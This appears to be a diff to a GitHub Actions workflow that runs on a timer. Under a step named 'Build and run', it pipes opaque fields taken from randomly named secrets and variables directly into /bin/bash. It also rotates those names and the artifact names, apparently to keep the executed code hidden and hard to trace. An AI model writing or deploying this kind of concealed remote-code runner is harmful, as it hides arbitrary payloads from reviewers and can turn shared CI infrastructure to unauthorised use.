@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '35 3,9,15,21 * * *'
+    - cron: '9 5,11,17,23 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -17,17 +17,16 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          hko3: ${{ secrets.hko3 }}
+          c074: ${{ secrets.c074 }}
         run: |
-          printf '%s' "$hko3" | jq -r .szb1 | /bin/bash
-          printf '%s' "$tezs2681" | jq -r .uovh275 | /bin/bash
-          printf '%s' "$btcfr796" | jq -r .dsg1457 | /bin/bash
-          echo $ika4 | jq -r .huo42716 | /bin/bash
+          printf '%s' "$c074" | jq -r .t592 | /bin/bash
+          echo $rtni9 | jq -r .ry4970 | /bin/bash
+          echo $mdy4455 | jq -r .gt90 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: E3J0xMQr
+          name: SNcD1VRU
           path: "*.zip"
           retention-days: 1
